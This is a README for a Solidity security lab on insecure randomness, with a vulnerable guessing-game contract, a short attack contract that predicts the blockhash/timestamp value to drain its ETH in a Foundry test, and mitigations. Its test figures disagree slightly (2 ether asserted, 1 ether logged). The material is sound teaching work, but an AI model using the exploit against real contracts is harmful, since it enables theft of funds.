
# 01 — Insecure Randomness 🎲❌

This example demonstrates a critical vulnerability in smart contracts that use **predictable on-chain data** like `block.timestamp` and `blockhash` as sources of randomness.

> ❗️ Never use on-chain values for randomness in security-sensitive logic.

---

## 📉 Vulnerability Summary

Random numbers are essential for lotteries, raffles, and games in smart contracts. Many developers attempt to generate random numbers like this:

```solidity
uint256 answer = uint256(
    keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
) % 10;
```

However:
- `block.timestamp` can be slightly manipulated by miners
- `blockhash(block.number - 1)` is public and known within the same block

This leads to **predictable and exploitable randomness**.

---

## 🔬 Target Contract

**File:** `src/GuessTheRandomNumber.sol`

The contract:
- Accepts 1 ETH from the deployer
- Offers 1 ETH to anyone who correctly guesses the "random" number between 0–9
- Uses the following for pseudo-randomness:

```solidity
uint256 answer = uint256(
    keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
) % 10;
```

This is vulnerable to prediction by attackers who can:
- Simulate the same values off-chain
- Call the contract with the exact answer

---

## 🧨 Attack Contract

**File:** `test/TestAttackGuessTheNumber.t.sol`

The attacker contract:
- Simulates the same `keccak256` calculation
- Calls `guess()` with the correct answer
- Wins 1 ETH from the game contract

The attack is wrapped in a single function call:

```solidity
function attack(IGuessTheRandomNumber _game) public {
    uint256 answer = uint256(
        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
    ) % 10;
    _game.guess(answer);
}
```

---

## 🧪 Foundry Test

**File:** `test/TestAttackGuessTheNumber.t.sol`

Tests:
- Simulate Alice deploying the game contract with 1 ETH
- Eve deploys the attacker contract
- Eve launches the attack and drains the funds

### ✅ Assertions

```solidity
assertEq(address(game).balance, 0);
assertEq(address(attacker).balance, 2 ether);
```

---

## 🧾 Run the Test

```bash
forge test
```

Expected output:

```
[PASS] testAttack() (gas: xxxx)
Logs:
  Game balance after attack: 0
  Attacker balance after attack: 1 ether
```

---

## 🔐 Mitigation

**✅ Never use on-chain data for randomness.**

### Use secure alternatives:

- ✅ [Chainlink VRF](https://docs.chain.link/vrf)
- ✅ Commit-reveal schemes (for low-stake games)
- ✅ Off-chain random number generation with verification

> 🧠 Always assume any on-chain value is visible and potentially manipulatable.

---

## 📁 Folder Structure

```
01-insecure-randomness/
├── src/
│   ├── GuessTheRandomNumber.sol   # Vulnerable contract
├── test/
│   └── TestAttackGuessTheNumber.t.sol # Foundry test file
├── foundry.toml                   # Foundry config
└── README.md                      # This file
```

---

## 📚 References

- [Solidity Security: Randomness](https://docs.soliditylang.org/en/latest/security-considerations.html#randomness)
- [Chainlink VRF](https://docs.chain.link/vrf)
- [Damn Vulnerable DeFi: Randomness](https://github.com/tinchoabbate/damn-vulnerable-defi)

---

## ✍️ Author

**Vishaal S (aka 0xvishh)**  
Smart Contract Auditor & Web3 Security Researcher  

- 🔗 [GitHub: @vishaalS7](https://github.com/vishaalS7)  
- 🧵 [X/Twitter: @0xvishh](https://x.com/0xvishh)  
- 📘 [Blog (Medium)](https://medium.com/@your-medium-handle) *(replace this)*

---

## 📝 Blog Post

📖 [Insecure Randomness — Explained with Code & Attack Demo](https://medium.com/@your-medium-handle/insecure-randomness-smart-contract-bug-top10) *(Replace with actual blog link)*

---

## 📌 Tags

`#Solidity` `#SmartContractSecurity` `#Randomness` `#BlockchainSecurity` `#Foundry` `#Top10Bugs`
